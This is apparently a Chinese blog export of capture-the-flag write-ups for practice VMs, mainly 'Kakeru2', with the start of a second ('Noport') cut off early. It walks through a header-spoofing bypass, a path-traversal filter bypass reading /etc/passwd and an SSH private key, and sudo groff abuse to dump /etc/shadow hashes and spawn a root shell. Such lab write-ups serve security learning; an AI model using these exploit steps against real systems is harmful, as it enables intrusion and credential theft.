<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.114.232/secret.php </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>403 Forbidden<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span><span class="tag">&lt;<span class="name">h1</span>&gt;</span>403 Forbidden<span class="tag">&lt;/<span class="name">h1</span>&gt;</span><span class="tag">&lt;<span class="name">p</span>&gt;</span>You don&#x27;t have permission to access this resource.<span class="tag">&lt;/<span class="name">p</span>&gt;</span> Maybe I only trust requests from localhost? <span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span> </span><br></pre></td></tr></table></figure></div>
<p>åœ¨è¿™é‡Œä¸ºäº†è®©ç›®æ ‡æ›´åŠ æ˜ç¡®ï¼Œ ç•™äº†ä¸ªæç¤ºï¼š ä»æœ¬åœ°è®¿é—® æ‰€ä»¥åŠ ä¸ŠX-Forwarded-Foræ ‡å¤´</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">â”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.114.232/secret.php -H &quot;X-Forwarded-For: 127.0.0.1&quot;</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Guayu çš„ç§˜å¯†æ–‡ä»¶é€šé“<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;congrats&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span><span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;highlight&quot;</span>&gt;</span>æ­å–œä½ <span class="tag">&lt;/<span class="name">span</span>&gt;</span>ä½ æˆåŠŸé€šè¿‡äº†ç¬¬ä¸€é“éªŒè¯ï¼Œæ‰¾åˆ°äº†è¿™ä¸ªç”± Guayu ç²¾å¿ƒç•™ä¸‹çš„åé—¨ï¼<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>è¯·å°å¿ƒä½¿ç”¨ï¼Œå¹¶éæ‰€æœ‰é—¨éƒ½ä¸ºä½ æ•å¼€...<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span>&gt;</span>å½“å‰è¯†åˆ«çš„è®¿é—®æº: <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;highlight&quot;</span>&gt;</span>127.0.0.1<span class="tag">&lt;/<span class="name">span</span>&gt;</span> (å·²æˆæƒ)<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">h2</span>&gt;</span>å†…éƒ¨æ–‡ä»¶æ¢æµ‹å™¨ v2.0 <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">        </span><br><span class="line">        <span class="tag">&lt;<span class="name">p</span>&gt;</span>è¾“å…¥æ–‡ä»¶çš„ç›¸å¯¹è·¯å¾„ (ç›¸å¯¹äºæ­¤è„šæœ¬ä½ç½®) æˆ–æŸäº›ç‰¹å®šæœåŠ¡çš„å·²çŸ¥è·¯å¾„ã€‚è¯·æ³¨æ„ï¼Œæ­¤å·¥å…·å†…ç½®äº†ä¸€äº›åŸºæœ¬çš„<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;highlight&quot;</span>&gt;</span>è·¯å¾„å®‰å…¨æ£€æŸ¥<span class="tag">&lt;/<span class="name">span</span>&gt;</span>ã€‚<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;GET&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/secret.php&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">label</span> <span class="attr">for</span>=<span class="string">&quot;filename&quot;</span>&gt;</span>ç›®æ ‡æ–‡ä»¶:<span class="tag">&lt;/<span class="name">label</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">id</span>=<span class="string">&quot;filename&quot;</span> <span class="attr">name</span>=<span class="string">&quot;filename&quot;</span> <span class="attr">placeholder</span>=<span class="string">&quot;ä¾‹å¦‚: welcome.txt æˆ– config/settings.ini&quot;</span> <span class="attr">autocomplete</span>=<span class="string">&quot;off&quot;</span> <span class="attr">value</span>=<span class="string">&quot;&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;[ æ¢æµ‹æ–‡ä»¶ ]&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"></span><br><span class="line">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">p</span> <span class="attr">style</span>=<span class="string">&quot;margin-top: 40px; font-size: 0.85em; color: #666; text-align: center;&quot;</span>&gt;</span></span><br><span class="line">        -- é€šé“ç»´æŠ¤è€…: Guayu </span><br><span class="line">    <span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>è¿™æ˜¯ä¸€ä¸ªæœ‰è¿‡æ»¤çš„è¯»å–æ–‡ä»¶çš„é¡µé¢ï¼Œä½ å¯ä»¥åœ¨è¾“å…¥æ¡†ä¸­è¾“å…¥æ–‡ä»¶ï¼Œä¹Ÿå¯ä»¥åœ¨urlé‡Œé¢ç›´æ¥å¸¦ä¸Šfilenameå‚æ•°<br>è¿™é‡Œå…ˆçœ‹çœ‹å½“å‰secret.phpçš„è¿‡æ»¤é€»è¾‘</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CAL"><figure class="iseeu highlight /cal"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl <span class="string">&quot;192.168.114.232/secret.php?filename=secret.php&quot;</span> -H <span class="string">&quot;X-Forwarded-For: 127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">if</span> (</span><br><span class="line">        substr($filename, <span class="number">0</span>, <span class="number">1</span>) === &amp;<span class="string">#039</span>;/&amp;<span class="string">#039</span>; ||</span><br><span class="line">        substr($filename, <span class="number">0</span>, <span class="number">3</span>) === &amp;<span class="string">#039</span>;../&amp;<span class="string">#039</span>; ||</span><br><span class="line">        strpos($filename, &amp;<span class="string">#039</span>;\\&amp;<span class="string">#039</span>;) !== <span class="literal">false</span> ||</span><br><span class="line">        strpos($filename, &amp;<span class="string">#039</span>;//&amp;<span class="string">#039</span>;) !== <span class="literal">false</span> ||</span><br><span class="line">	    strpos($filename, &amp;<span class="string">#039</span>;...&amp;<span class="string">#039</span>;) !== <span class="literal">false</span> ||</span><br><span class="line">	    strpos($filename, &amp;<span class="string">#039</span>;://&amp;<span class="string">#039</span>;) !== <span class="literal">false</span></span><br><span class="line">    ) &#123;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œå°±æ˜¯ä¸èƒ½ä»¥<code>/</code>å¼€å¤´ï¼Œä¸èƒ½ç”¨<code>...</code>è¿™ç§å¤å†™ç»•è¿‡ï¼Œå¹¶ä¸”ç¦æ­¢ä½¿ç”¨phpä¼ªåè®®<br>è¿™é‡Œè€ƒå¯Ÿçš„æ˜¯ç”¨<code>./</code> è¿™ä¸ªå½“å‰ç›®å½•å’Œ<code>../</code>ç»“åˆæ¥ç»•è¿‡<br>æ‰€ä»¥ç”¨<code>./.././.././../etc/passwd</code>æµ‹è¯•æ˜¯å¦å¯ä»¥è¯»å–æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># curl &quot;192.168.114.232/secret.php?filename=./.././.././../etc/passwd&quot; -H &quot;X-Forwarded-For: 127.0.0.1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br><span class="line"><span class="symbol">games:</span><span class="symbol">x:</span><span class="number">5</span><span class="symbol">:</span><span class="number">60</span><span class="symbol">:games</span><span class="symbol">:/usr/games</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">man:</span><span class="symbol">x:</span><span class="number">6</span><span class="symbol">:</span><span class="number">12</span><span class="symbol">:man</span><span class="symbol">:/var/cache/man</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">lp:</span><span class="symbol">x:</span><span class="number">7</span><span class="symbol">:</span><span class="number">7</span><span class="symbol">:lp</span><span class="symbol">:/var/spool/lpd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">mail:</span><span class="symbol">x:</span><span class="number">8</span><span class="symbol">:</span><span class="number">8</span><span class="symbol">:mail</span><span class="symbol">:/var/mail</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">news:</span><span class="symbol">x:</span><span class="number">9</span><span class="symbol">:</span><span class="number">9</span><span class="symbol">:news</span><span class="symbol">:/var/spool/news</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">uucp:</span><span class="symbol">x:</span><span class="number">10</span><span class="symbol">:</span><span class="number">10</span><span class="symbol">:uucp</span><span class="symbol">:/var/spool/uucp</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">proxy:</span><span class="symbol">x:</span><span class="number">13</span><span class="symbol">:</span><span class="number">13</span><span class="symbol">:proxy</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">www-<span class="symbol">data:</span><span class="symbol">x:</span><span class="number">33</span><span class="symbol">:</span><span class="number">33</span><span class="symbol">:www-data</span><span class="symbol">:/var/www</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">backup:</span><span class="symbol">x:</span><span class="number">34</span><span class="symbol">:</span><span class="number">34</span><span class="symbol">:backup</span><span class="symbol">:/var/backups</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">list:</span><span class="symbol">x:</span><span class="number">38</span><span class="symbol">:</span><span class="number">38</span><span class="symbol">:Mailing</span> <span class="title class_">List</span> <span class="symbol">Manager:</span>/var/<span class="symbol">list:</span>/usr/sbin/nologin</span><br><span class="line"><span class="symbol">irc:</span><span class="symbol">x:</span><span class="number">39</span><span class="symbol">:</span><span class="number">39</span><span class="symbol">:ircd</span><span class="symbol">:/var/run/ircd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">gnats:</span><span class="symbol">x:</span><span class="number">41</span><span class="symbol">:</span><span class="number">41</span><span class="symbol">:Gnats</span> <span class="title class_">Bug</span>-<span class="title class_">Reporting</span> <span class="title class_">System</span> (admin)<span class="symbol">:/var/lib/gnats</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">nobody:</span><span class="symbol">x:</span><span class="number">65534</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:nobody</span><span class="symbol">:/nonexistent</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">_apt:</span><span class="symbol">x:</span><span class="number">100</span><span class="symbol">:</span><span class="number">65534</span>::/<span class="symbol">nonexistent:</span>/usr/sbin/nologin</span><br><span class="line">systemd-<span class="symbol">timesync:</span><span class="symbol">x:</span><span class="number">101</span><span class="symbol">:</span><span class="number">102</span><span class="symbol">:systemd</span> <span class="title class_">Time</span> <span class="title class_">Synchronization</span>,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">systemd-<span class="symbol">network:</span><span class="symbol">x:</span><span class="number">102</span><span class="symbol">:</span><span class="number">103</span><span class="symbol">:systemd</span> <span class="title class_">Network</span> <span class="title class_">Management</span>,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">systemd-<span class="symbol">resolve:</span><span class="symbol">x:</span><span class="number">103</span><span class="symbol">:</span><span class="number">104</span><span class="symbol">:systemd</span> <span class="title class_">Resolver</span>,,,<span class="symbol">:/run/systemd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line">systemd-<span class="symbol">coredump:</span><span class="symbol">x:</span><span class="number">999</span><span class="symbol">:</span><span class="number">999</span><span class="symbol">:systemd</span> <span class="title class_">Core</span> <span class="symbol">Dumper:</span>/<span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">messagebus:</span><span class="symbol">x:</span><span class="number">104</span><span class="symbol">:</span><span class="number">110</span>::/<span class="symbol">nonexistent:</span>/usr/sbin/nologin</span><br><span class="line"><span class="symbol">sshd:</span><span class="symbol">x:</span><span class="number">105</span><span class="symbol">:</span><span class="number">65534</span>::/run/<span class="symbol">sshd:</span>/usr/sbin/nologin</span><br><span class="line"><span class="symbol">guayu:</span><span class="symbol">x:</span><span class="number">1000</span><span class="symbol">:</span><span class="number">1000</span><span class="symbol">:</span>,,,<span class="symbol">:/home/guayu</span><span class="symbol">:/bin/bash</span></span><br></pre></td></tr></table></figure></div>
<p>å‘ç°æ˜¯å¯ä»¥çš„ï¼Œç„¶åæœ‰ä¸€ä¸ªguayuç”¨æˆ·ï¼Œè¯»å–è¯»å–&#x2F;home&#x2F;guayu&#x2F;.ssh&#x2F;id_rsa è·å¾—è¯¥ç”¨æˆ·çš„ç§é’¥å°±èƒ½ç™»ä¸Šè¿™ä¸ªç”¨æˆ·</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APPLESCRIPT"><figure class="iseeu highlight /applescript"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># chmod 600 id_rsa                                                                                                </span></span><br><span class="line">                                                                                                                                                         </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># ls -al id_rsa   </span></span><br><span class="line">-rw<span class="comment">------- 1 root root 3381 Jun  4 10:22 id_rsa</span></span><br><span class="line">                                                                                                                                                         </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># ssh guayu@192.168.114.232 -i id_rsa</span></span><br><span class="line">Linux Kakeru2 <span class="number">4.19</span><span class="number">.0</span><span class="number">-27</span>-amd64 <span class="comment">#1 SMP Debian 4.19.316-1 (2024-06-25) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> <span class="keyword">the</span> Debian GNU/Linux system are free software;</span><br><span class="line"><span class="keyword">the</span> exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> <span class="keyword">the</span></span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes <span class="keyword">with</span> ABSOLUTELY NO WARRANTY, <span class="keyword">to</span> <span class="keyword">the</span> extent</span><br><span class="line">permitted <span class="keyword">by</span> applicable law.</span><br><span class="line">Last login: Mon Jun  <span class="number">2</span> <span class="number">11</span>:<span class="number">29</span>:<span class="number">06</span> <span class="number">2025</span> <span class="keyword">from</span> <span class="number">192.168</span><span class="number">.114</span><span class="number">.11</span></span><br><span class="line">guayu@Kakeru2:~$ ls <span class="built_in">id</span></span><br><span class="line">ls: cannot access &#x27;<span class="built_in">id</span>&#x27;: No such <span class="built_in">file</span> <span class="keyword">or</span> directory</span><br><span class="line">guayu@Kakeru2:~$ <span class="built_in">id</span></span><br><span class="line">uid=<span class="number">1000</span>(guayu) gid=<span class="number">1000</span>(guayu) groups=<span class="number">1000</span>(guayu)</span><br></pre></td></tr></table></figure></div>

<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>sudo -l å‘ç°å¯ä»¥ä½¿ç”¨groff æŒ‡ä»¤ è¿™ä¸ªæ˜¯ä¸€ä¸ªæ ¼å¼åŒ–æ‰‹å†™æ–‡æ¡£çš„å·¥å…·</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">guayu<span class="variable">@Kakeru2</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> guayu on <span class="symbol">Kakeru2:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> guayu may run the following commands on <span class="symbol">Kakeru2:</span></span><br><span class="line">    (<span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/bin/groff *</span><br></pre></td></tr></table></figure></div>
<p>ç¬¬ä¸€ç§æ–¹æ³•å¯ä»¥ç›´æ¥ç”¨è¿™ä¸ªå·¥å…·æ¥è¯»å–æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DNS"><figure class="iseeu highlight /dns"><table><tr><td class="code"><pre><span class="line">guayu@Kakeru2:~$ sudo /usr/bin/groff  -man -Tascii /etc/shadow</span><br><span class="line">troff: /etc/shadow:<span class="number">1</span>: warning [p <span class="number">1</span>, <span class="number">0</span>.<span class="number">0</span>i]: cannot adjust line</span><br><span class="line">troff: /etc/shadow:<span class="number">1</span>: warning [p <span class="number">1</span>, <span class="number">0</span>.<span class="number">2</span>i]: cannot adjust line</span><br><span class="line">troff: /etc/shadow:<span class="number">26</span>: warning [p <span class="number">1</span>, <span class="number">2</span>.<span class="number">5</span>i]: cannot adjust line</span><br><span class="line">troff: /etc/shadow:<span class="number">26</span>: warning [p <span class="number">1</span>, <span class="number">2</span>.<span class="number">7</span>i]: cannot adjust line</span><br><span class="line">root:$<span class="number">6</span>$TkJiunDYYH/<span class="number">8</span>ETYb$Rbor5mqOT0O3bOcsMWEzgO2QvN2ttdlkJcM-</span><br><span class="line">GIo5LDi4oxwESo0VsLx3zL0x3eA3L5MTNhyaGl7EUCbDi-</span><br><span class="line">vBgeb/:<span class="number">20242:0</span>:<span class="number">99999:7</span>:::             daemon:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::</span><br><span class="line">bin:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::                 sys:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::</span><br><span class="line">sync:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::              games:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::</span><br><span class="line">man:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::                  lp:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::</span><br><span class="line">mail:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::               news:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::</span><br><span class="line">uucp:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::   proxy:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::    www-da-</span><br><span class="line">ta:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::               backup:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::</span><br><span class="line">list:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::                irc:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::</span><br><span class="line">gnats:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::            nobody:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::</span><br><span class="line">_apt:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::   systemd-timesync:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::</span><br><span class="line">systemd-network:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::                  systemd-re-</span><br><span class="line">solve:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::  systemd-coredump:!!:<span class="number">20166</span>::::::  mes-</span><br><span class="line">sagebus:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::            sshd:*:<span class="number">20166:0</span>:<span class="number">99999:7</span>:::</span><br><span class="line">guayu:$<span class="number">6</span>$TX3nztwWtmEYaSQI$xj7ofvrgPmkM4tQ-</span><br><span class="line">CY8hUV1P905H3yvz3F90KYq/tHUDcD8cCAhT92.vNIRz8Iyu9vLHBmXQY-</span><br><span class="line">BXFC.akO2XKb2/:<span class="number">20241:0</span>:<span class="number">99999:7</span>:::</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>æ•´ç†ä¸€ä¸‹rootçš„æ ¼å¼ç„¶åå¯ä»¥çˆ†ç ´å¯†ç (å·®ä¸å¤šçˆ†ç ´æ—¶é—´4ï¼Œ5åˆ†é’Ÿ)</p>
<p>ç¬¬äºŒç§æ–¹å¼æ˜¯ä½¿ç”¨-Uæ‰§è¡Œå‘½ä»¤<br>å†™ä¸€ä¸ª.roffæ–‡ä»¶ ç„¶åç”¨-Uæ‰§è¡Œ  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;.pso /bin/bash&#x27;</span> &gt; payload.roff</span><br><span class="line"><span class="built_in">sudo</span> /usr/bin/groff -U payload.roff</span><br></pre></td></tr></table></figure></div>
<p>.psoä¼šè®©groffè°ƒç”¨å¤–éƒ¨ç¨‹åºæ‰§è¡Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">guayu<span class="variable">@Kakeru2</span><span class="symbol">:~</span><span class="variable">$ </span>sudo /usr/bin/groff -U payload.roff </span><br><span class="line">root<span class="variable">@Kakeru2</span><span class="symbol">:/home/guayu</span><span class="comment"># chmod +s /bin/bash</span></span><br><span class="line">root<span class="variable">@Kakeru2</span><span class="symbol">:/home/guayu</span><span class="comment"># exit</span></span><br><span class="line">exit</span><br><span class="line">guayu<span class="variable">@Kakeru2</span><span class="symbol">:~</span><span class="variable">$ </span>bash -p</span><br><span class="line">bash<span class="number">-5.0</span><span class="comment"># id</span></span><br><span class="line">uid=<span class="number">1000</span>(guayu) gid=<span class="number">1000</span>(guayu) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">1000</span>(guayu)</span><br></pre></td></tr></table></figure></div>

<p>å½“ç„¶è¿™ä¸ªå·¥å…·å¯ä»¥ç›´æ¥è¯»æ–‡ä»¶ï¼Œä½ è¦æ˜¯ç›´æ¥è¯»flagä¹Ÿè¡Œ </p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>ç¾¤å‹é¶æœº</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>ç¾¤å‹é¶æœº-Noportå¤ç›˜</title>
    <url>/posts/28847.html</url>
    <content><![CDATA[<p>åšäº†ä¸€å¤©æ²¡åšå‡ºæ¥ï¼Œçœ‹äº†wpå¤ç›˜æ€»ç»“ä¸€ä¸‹</p>
<span id="more"></span>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><p>ç®€å•æ‰«ä¸€ä¸‹ç«¯å£å¼€æ”¾ä»€ä¹ˆ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="keyword">nmap</span> -<span class="keyword">p</span>- <span class="number">192.168</span>.<span class="number">34.83</span> </span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https://<span class="keyword">nmap</span>.org ) at <span class="number">2025</span>-<span class="number">04</span>-<span class="number">24</span> <span class="number">19</span>:<span class="number">37</span> CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> bogon (<span class="number">192.168</span>.<span class="number">34.83</span>)</span><br><span class="line">Host <span class="keyword">is</span> <span class="keyword">up</span> (<span class="number">0.029</span>s latency).</span><br><span class="line">Not shown: <span class="number">65534</span> filtered tcp ports (<span class="keyword">no</span>-response)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line"><span class="number">80</span>/tcp <span class="keyword">open</span>  http</span><br><span class="line">MAC Address: C8:<span class="number">21</span>:<span class="number">58</span>:<span class="number">16</span>:CF:C4 (Intel Corporate)</span><br><span class="line"></span><br><span class="line">Nmap done: <span class="number">1</span> IP address (<span class="number">1</span> host <span class="keyword">up</span>) scanned in <span class="number">143.86</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>åªå¼€æ”¾äº†80ç«¯å£</p>
<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><p>é¦–é¡µå°±æ˜¯ä¸€ä¸ªç™»å½•ç•Œé¢ï¼Œä¹Ÿçˆ†ç ´ä¸å‡ºæ¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# curl 192.168.34.83 </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Login<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span> <span class="attr">action</span>=<span class="string">&quot;/login&quot;</span>&gt;</span></span><br><span class="line">        Username: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        Password: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;password&quot;</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">        